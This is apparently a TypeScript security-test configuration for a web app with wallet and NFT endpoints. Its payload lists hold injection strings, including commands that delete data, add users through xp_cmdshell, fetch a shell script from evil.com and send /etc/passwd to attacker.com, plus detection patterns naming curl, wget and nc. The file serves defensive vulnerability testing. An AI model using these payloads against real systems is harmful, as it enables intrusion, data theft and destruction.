/**
 * Security Testing Configuration
 * Centralized configuration for all security tests and vulnerability scanning
 */

export interface SecurityTestConfig {
  // Test execution settings
  timeout: number;
  retries: number;
  parallel: boolean;
  verbose: boolean;

  // Vulnerability scanning settings
  vulnerabilityScanning: {
    enabled: boolean;
    payloadSets: string[];
    maxPayloadSize: number;
    timeoutPerPayload: number;
  };

  // Penetration testing settings
  penetrationTesting: {
    enabled: boolean;
    aggressiveMode: boolean;
    targetEndpoints: string[];
    excludeEndpoints: string[];
  };

  // Compliance testing settings
  compliance: {
    owasp: boolean;
    gdpr: boolean;
    hongKongPrivacy: boolean;
    customStandards: string[];
  };

  // Rate limiting test settings
  rateLimiting: {
    maxRequestsPerSecond: number;
    burstSize: number;
    testDuration: number;
  };

  // Performance security settings
  performance: {
    maxResponseTime: number;
    memoryThreshold: number;
    cpuThreshold: number;
  };

  // Reporting settings
  reporting: {
    generateReport: boolean;
    reportFormat: 'json' | 'html' | 'pdf';
    includePayloads: boolean;
    includeFalsePositives: boolean;
  };
}

export const defaultSecurityConfig: SecurityTestConfig = {
  timeout: 300000, // 5 minutes
  retries: 2,
  parallel: false,
  verbose: true,

  vulnerabilityScanning: {
    enabled: true,
    payloadSets: [
      'sql-injection',
      'xss',
      'command-injection',
      'path-traversal',
      'nosql-injection',
      'ldap-injection',
      'xml-injection',
      'template-injection'
    ],
    maxPayloadSize: 10000,
    timeoutPerPayload: 5000
  },

  penetrationTesting: {
    enabled: true,
    aggressiveMode: false,
    targetEndpoints: [
      '/api/auth/*',
      '/api/user/*',
      '/api/admin/*',
      '/api/nft/*',
      '/api/wallet/*',
      '/api/contract/*'
    ],
    excludeEndpoints: [
      '/api/health',
      '/api/status'
    ]
  },

  compliance: {
    owasp: true,
    gdpr: true,
    hongKongPrivacy: true,
    customStandards: ['blockchain-security', 'nft-security']
  },

  rateLimiting: {
    maxRequestsPerSecond: 100,
    burstSize: 200,
    testDuration: 60000 // 1 minute
  },

  performance: {
    maxResponseTime: 2000, // 2 seconds
    memoryThreshold: 512 * 1024 * 1024, // 512MB
    cpuThreshold: 80 // 80%
  },

  reporting: {
    generateReport: true,
    reportFormat: 'json',
    includePayloads: false,
    includeFalsePositives: false
  }
};

/**
 * Security Test Payloads
 * Comprehensive collection of attack payloads for vulnerability testing
 */
export const SecurityPayloads = {
  sqlInjection: [
    // Basic SQL injection
    "'; DROP TABLE users; --",
    "' OR '1'='1",
    "' OR 1=1 --",
    "admin'--",
    "admin'/*",
    
    // Union-based SQL injection
    "' UNION SELECT 1,2,3,4,5,6,7,8,9,10 --",
    "' UNION SELECT null,username,password,null FROM users --",
    "' UNION ALL SELECT 1,2,3,4,5,6,7,8,9,10 --",
    
    // Boolean-based blind SQL injection
    "' AND (SELECT COUNT(*) FROM users) > 0 --",
    "' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a' --",
    
    // Time-based blind SQL injection
    "'; WAITFOR DELAY '00:00:05'; --",
    "' OR (SELECT COUNT(*) FROM users WHERE SUBSTRING(password,1,1)='a')>0 WAITFOR DELAY '00:00:05'; --",
    
    // Error-based SQL injection
    "' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version()), 0x7e)) --",
    "' AND (SELECT * FROM (SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) --",
    
    // Second-order SQL injection
    "admin'; INSERT INTO users VALUES ('hacker','password'); SELECT * FROM users WHERE username='",
    
    // Stored procedure attacks
    "'; EXEC sp_configure 'show advanced options', 1; --",
    "'; EXEC xp_cmdshell 'net user hacker password /add'; --"
  ],

  xss: [
    // Basic XSS
    '<script>alert("XSS")</script>',
    '<script>alert(1)</script>',
    '<img src="x" onerror="alert(1)">',
    '<svg onload="alert(1)">',
    
    // Event handler XSS
    '<input onfocus="alert(1)" autofocus>',
    '<select onfocus="alert(1)" autofocus><option>test</option></select>',
    '<body onload="alert(1)">',
    '<div onclick="alert(1)">Click me</div>',
    
    // JavaScript protocol XSS
    'javascript:alert("XSS")',
    '<a href="javascript:alert(1)">Click</a>',
    
    // CSS-based XSS
    '<style>@import"javascript:alert(1)";</style>',
    '<link rel="stylesheet" href="javascript:alert(1)">',
    
    // SVG-based XSS
    '<svg><script>alert(1)</script></svg>',
    '<svg onload="alert(1)">',
    
    // Data URI XSS
    '<iframe src="data:text/html,<script>alert(1)</script>"></iframe>',
    
    // Filter evasion
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    
    // Polyglot payloads
    'javascript:/*--></title></style></textarea></script></xmp><svg/onload=alert(1)>',
    '"><script>alert(1)</script>',
    
    // Template injection XSS
    '{{constructor.constructor("alert(1)")()}}',
    '${alert(1)}',
    '#{alert(1)}'
  ],

  commandInjection: [
    // Basic command injection
    '; ls -la',
    '| cat /etc/passwd',
    '&& rm -rf /',
    '`whoami`',
    '$(id)',
    
    // Advanced command injection
    '; ping google.com',
    '| nc -l 4444',
    '&& curl malicious-site.com',
    '; wget http://evil.com/shell.sh',
    '`curl -X POST http://attacker.com/steal --data "$(cat /etc/passwd)"`',
    
    // Windows command injection
    '& dir',
    '| type C:\\Windows\\System32\\drivers\\etc\\hosts',
    '&& del /F /Q C:\\*.*',
    
    // Encoded command injection
    '%3B%20ls%20-la',
    '%7C%20cat%20%2Fetc%2Fpasswd',
    '%26%26%20whoami'
  ],

  pathTraversal: [
    // Basic path traversal
    '../../../etc/passwd',
    '..\\..\\..\\windows\\system32\\config\\sam',
    '....//....//....//etc/passwd',
    
    // Encoded path traversal
    '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
    '..%252f..%252f..%252fetc%252fpasswd',
    '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
    
    // Absolute path traversal
    '/var/www/../../etc/passwd',
    'file:///etc/passwd',
    '\\..\\..\\..\\etc\\passwd',
    
    // Null byte injection
    '../../../etc/passwd%00.jpg',
    '..\\..\\..\\windows\\system32\\config\\sam%00.txt'
  ],

  noSqlInjection: [
    // MongoDB injection
    '{"$where": "function() { return true; }"}',
    '{"$regex": ".*"}',
    '{"$ne": null}',
    '{"$gt": ""}',
    '{"$exists": true}',
    '{"$in": ["admin", "user"]}',
    
    // Complex NoSQL injection
    '{"username": {"$ne": null}, "password": {"$ne": null}}',
    '{"$or": [{"username": "admin"}, {"role": "admin"}]}',
    '{"$where": "this.username == this.password"}',
    
    // JavaScript injection in NoSQL
    '{"$where": "function() { var date = new Date(); do { curDate = new Date(); } while(curDate-date<10000); return Math.max(); }"}',
    '{"$where": "sleep(5000) || true"}'
  ],

  ldapInjection: [
    // Basic LDAP injection
    '*)(&(objectClass=*)',
    '*)(uid=*))(|(uid=*',
    '*)(|(password=*))',
    
    // Advanced LDAP injection
    '*)(&(|(objectClass=*)(objectClass=*))',
    '*))%00',
    '*()|%26\'',
    
    // LDAP filter bypass
    '*)(&(objectClass=user)(|(cn=*)(sn=*)))',
    '*)(objectClass=*))(&(objectClass=void'
  ],

  xmlInjection: [
    // XML External Entity (XXE)
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root>&test;</root>',
    '<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "http://attacker.com/evil.dtd">]><root>&test;</root>',
    
    // XML bomb
    '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
    
    // SOAP injection
    '<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"><soap:Body><test>XXE_PAYLOAD</test></soap:Body></soap:Envelope>'
  ],

  templateInjection: [
    // Server-side template injection
    '{{7*7}}',
    '${7*7}',
    '#{7*7}',
    '<%=7*7%>',
    
    // Advanced template injection
    '{{config.items()}}',
    '{{request.application.__globals__.__builtins__.__import__("os").popen("id").read()}}',
    '${T(java.lang.Runtime).getRuntime().exec("calc")}',
    
    // Freemarker injection
    '<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }',
    
    // Velocity injection
    '#set($ex=$rt.getRuntime().exec("whoami"))',
    
    // Smarty injection
    '{php}echo `id`;{/php}'
  ]
};

/**
 * Security Test Utilities
 */
export class SecurityTestUtils {
  static generateRandomPayload(length: number = 1000): string {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()_+-=[]{}|;:,.<>?';
    let result = '';
    for (let i = 0; i < length; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  }

  static generateFuzzingPayloads(count: number = 100): string[] {
    const payloads = [];
    
    for (let i = 0; i < count; i++) {
      const length = Math.floor(Math.random() * 10000) + 1;
      payloads.push(this.generateRandomPayload(length));
    }
    
    return payloads;
  }

  static createDeepNestedObject(depth: number = 1000): any {
    let obj: any = { value: 'end' };
    for (let i = 0; i < depth; i++) {
      obj = { nested: obj };
    }
    return obj;
  }

  static createLargeArray(size: number = 100000): any[] {
    return new Array(size).fill('test-data');
  }

  static createCircularReference(): any {
    const obj: any = { name: 'test' };
    obj.self = obj;
    return obj;
  }

  static isValidWalletAddress(address: string): boolean {
    return /^0x[a-fA-F0-9]{40}$/.test(address);
  }

  static isValidTransactionHash(hash: string): boolean {
    return /^0x[a-fA-F0-9]{64}$/.test(hash);
  }

  static sanitizeForLog(data: any): any {
    const sensitiveFields = ['password', 'secret', 'key', 'token', 'private'];
    
    if (typeof data === 'string') {
      return sensitiveFields.some(field => 
        data.toLowerCase().includes(field)
      ) ? '[REDACTED]' : data;
    }
    
    if (typeof data === 'object' && data !== null) {
      const sanitized: any = {};
      for (const [key, value] of Object.entries(data)) {
        if (sensitiveFields.some(field => key.toLowerCase().includes(field))) {
          sanitized[key] = '[REDACTED]';
        } else {
          sanitized[key] = this.sanitizeForLog(value);
        }
      }
      return sanitized;
    }
    
    return data;
  }
}

/**
 * Security Test Assertions
 */
export class SecurityAssertions {
  static assertNoSQLInjection(response: any): void {
    const responseStr = JSON.stringify(response);
    const sqlPatterns = [
      /DROP\s+TABLE/i,
      /UNION\s+SELECT/i,
      /INSERT\s+INTO/i,
      /DELETE\s+FROM/i,
      /UPDATE\s+SET/i,
      /--/,
      /\/\*/,
      /\*\//
    ];

    sqlPatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`SQL injection pattern detected: ${pattern}`);
      }
    });
  }

  static assertNoXSS(response: any): void {
    const responseStr = JSON.stringify(response);
    const xssPatterns = [
      /<script[^>]*>/i,
      /javascript:/i,
      /onerror\s*=/i,
      /onload\s*=/i,
      /onclick\s*=/i,
      /onfocus\s*=/i,
      /alert\s*\(/i,
      /eval\s*\(/i
    ];

    xssPatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`XSS pattern detected: ${pattern}`);
      }
    });
  }

  static assertNoCommandInjection(response: any): void {
    const responseStr = JSON.stringify(response);
    const commandPatterns = [
      /ls\s+-la/i,
      /cat\s+\/etc\/passwd/i,
      /rm\s+-rf/i,
      /whoami/i,
      /ping\s+/i,
      /curl\s+/i,
      /wget\s+/i,
      /nc\s+-l/i
    ];

    commandPatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`Command injection pattern detected: ${pattern}`);
      }
    });
  }

  static assertNoPathTraversal(response: any): void {
    const responseStr = JSON.stringify(response);
    const pathPatterns = [
      /\.\.\//,
      /\.\.\\/,
      /\/etc\/passwd/i,
      /windows\\system32/i,
      /%2e%2e%2f/i,
      /%252f/i
    ];

    pathPatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`Path traversal pattern detected: ${pattern}`);
      }
    });
  }

  static assertSecurityHeaders(headers: any): void {
    const requiredHeaders = [
      'x-content-type-options',
      'x-frame-options',
      'x-xss-protection',
      'content-security-policy'
    ];

    requiredHeaders.forEach(header => {
      if (!headers[header]) {
        throw new Error(`Missing security header: ${header}`);
      }
    });
  }

  static assertNoSensitiveDataExposure(response: any): void {
    const responseStr = JSON.stringify(response).toLowerCase();
    const sensitivePatterns = [
      /password/,
      /secret/,
      /private.*key/,
      /api.*key/,
      /credit.*card/,
      /ssn/,
      /social.*security/
    ];

    sensitivePatterns.forEach(pattern => {
      if (pattern.test(responseStr)) {
        throw new Error(`Sensitive data exposure detected: ${pattern}`);
      }
    });
  }
}

export default {
  SecurityPayloads,
  SecurityTestUtils,
  SecurityAssertions,
  defaultSecurityConfig
};